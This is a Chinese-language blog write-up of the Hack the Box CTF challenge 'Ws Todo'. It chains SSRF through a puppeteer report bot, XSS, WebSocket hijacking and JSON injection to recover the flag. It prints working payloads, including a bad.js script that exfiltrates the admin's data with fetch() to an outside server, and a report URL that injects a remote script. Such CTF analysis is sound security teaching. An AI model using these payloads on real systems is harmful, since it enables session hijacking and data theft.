---
title: "Hack the Box——Ws Todo"
date: 2023-03-01T23:05:48+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x01 访问界面

题目给了两个端口，也就是起了两个web服务，一个是一个TODO应用，一个是。。。额。html测试器？

`应用一界面`
![1.png](1.png)

`应用二界面`
![2.png](2.png)

## 0x02 SSRF

作者直接给出了源码，页面里看不出啥，我们直接来看源码

在`util/report.js`发现了可疑的地方。
```js
const LOGIN_URL = "http://127.0.0.1/login";

let browser = null

const visit = async (url) => {
    const ctx = await browser.createIncognitoBrowserContext()
    const page = await ctx.newPage()

    await page.goto(LOGIN_URL, { waitUntil: 'networkidle2' })
    await page.waitForSelector('form')
    await page.type('wired-input[name=username]', process.env.USERNAME)
    await page.type('wired-input[name=password]', process.env.PASSWORD)
    await page.click('wired-button')

    try {
        await page.goto(url, { waitUntil: 'networkidle2' })
    } finally {
        await page.close()
        await ctx.close()
    }
}

const doReportHandler = async (req, res) => {
    ...
    await visit(url)
    ...
}

```

（又是puppeteer）,好像最近htb挺多puppeteer的题的。那思路应该往ssrf方向靠了。

在`routes/index.js`里可以看到`router.post('/report', doReportHandler);`

意思就是，我们直接`POST /report`，可以让服务端的puppeteer访问任意网页造成SSRF。

## 0x03 XSS

很容易想到刚刚的应用二，应该是这个html测试服务，这个html测试服务，`http://178.62.8.249:31022/index.php?html=`
html参数传的值会显示到页面，并且不过滤html标签，那xss就来啦。

![3.png](3.png)

## 0x04 漏洞利用

那么怎么利用这两个洞呢，先看flag放在哪，应用一里有一个websocket服务，负责添加和获取todo，里面有一段
```
                    if (userId === 1) {
                        quote = `A wise man once said, "the flag is ${process.env.FLAG}".`;
                    } else {
                        quote = quotes[Math.floor(Math.random() * quotes.length)];
                    }
```

这个`userId===1`是初始化数据库的时候自动建的admin账户，刚好`report.js`里在访问任意界面前都会登录一下这个admin账户，
那思路就很明确了，访问一个用应用二构造的恶意界面，把flag发给我们。

如果是正常的http请求，可能会因为跨域问题没办法拿到数据，但是websocket是不考虑跨域的，可以直接拿到数据。

我们直接在vps上构造一个恶意js

```js
const ws = new WebSocket(`ws://127.0.0.1/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'add' }))
    ws.send(JSON.stringify({ action: 'get' }))
}

ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("http://myvps/" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}
```

然后`POST /report`传入
```json
{
    "url": "http://127.0.0.1:8080/index.php?html=%3Cscript%20src=%22http://myvps/bad.js%22%3E%3C/script%3E"
}
```

触发流程就是

`doReportHandler`接受请求 -> puppeteer登录admin账户 -> 访问传入的url -> 加载我们的bad.js -> 连接应用一的websocket并发送消息 -> 拿到flag（加密后的）

## 0x05 JSON注入

利用刚刚的payload我们只能得到加密过的信息。

![4](4.png)

我们还需要一个密钥来对信息进行解密，继续挖源码，这里用的是aes加密，admin账户的密钥是初始化数据库的时候就写死的。

这里卡了好久，一开始的思路还是从绕过跨域来拿到admin账户的密钥

试了修改`document.domain`+iframe，但是并没有成功绕过，看来CORS以及把我们能想到的都想了。

那只能继续挖源码了。

搜了下nodejs常见漏洞，看到有一个反引号“\`”的用法，`wsHandler.js`里有一段代码用到了反引号

```js
await db.addTask(userId, `{"title":"${data.title}","description":"${data.description}","secret":"${secret}"}`);

    async addTask(userId, data) {
        const result = await this.query('INSERT INTO todos (user_id, data) VALUES (?, ?)', [userId, data]);
        return result;
    }
    ...

    const task = JSON.parse(result.data);
```

这里的反引号直接生成的是一个字符串，然后这个字符串直接被插入了数据库，然后这个data在取出来的时候直接用JSON.parse解析，那么这里我们可以通过控制我们传入的`description`的值，来修改让这个json变成我们想要的内容。

比如`description`传`desc\",\"secret\":\"bad secret\"}`

![5](5.png)
可以看到data字符串成功被我们修改。

还有一个问题，这个字符串在被`JSON.parse`解析的时候依然会报错。

对于这个点，因为data字段的长度最大是255

`data VARCHAR(255) NOT NULL,`

我们可以通过在前面填充垃圾数据方式让后面导致json无效的字串被mysql截段。

这里我们成功通过JSON注入让secret可控，secret可控，那我们就可以调用应用给的解密接口解密出密钥了。

## 0x06 最终流程及payload

首先，随便注册一个账号并登录

然后，在`POST /report`
```json
{
    "url": "http://127.0.0.1:8080/index.php?html=%3Cscript%20src=%22http://yourvps/bad.js%22%3E%3C/script%3E"
}
```
在vps上拿到加密的flag，并用我们注入的secret解密

调用`POST /decrpy`接口解密出flag

![7](7.png)

bad.js内容为
```js
const ws = new WebSocket(`ws://127.0.0.1/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify(
        {
             action: 'add',
              title: "1",
              description: "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\",\"secret\": \"73c12045f8de028073fdbe7931f2ff86\"}" 
    }));
    ws.send(JSON.stringify({ action: 'get' }))
}
ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("http://47.113.144.177:8000/" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}
```

## 0x07 总结

我觉得这道题主要考察一个代码审计能力以及puppeteer+SSRF相关的知识，

关于puppeteer这块，好像挺多可玩的，我记得之前做过一次用img的onerror来爆破flag的，还有去年研究生赛的CSP report-uri。

其次就是代码审计，事后我把json注入那段代码发给chatgpt并问它存不存在漏洞，一眼就被他看出来了

```
Yes, there are several potential security vulnerabilities in this code:

1. Injection vulnerability: The `title`, `description`, and `secret` fields in the add action are concatenated to form a JSON string without any input validation or sanitization. An attacker could potentially inject malicious code into these fields that could lead to various types of attacks, such as SQL injection, cross-site scripting (XSS), or remote code execution.
```

看来以后可以考虑用它来辅助代码审计了。

## 0x08 参考链接

[浅析NodeJS](https://xz.aliyun.com/t/11791#toc-8)
[跨源资源共享（CORS）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
[JavaScript 通信 / CORS、WebSocket](https://www.jianshu.com/p/a83c63db731f)
[JSON注入入门](https://www.wangan.com/p/7fy7f42cbeff32a2)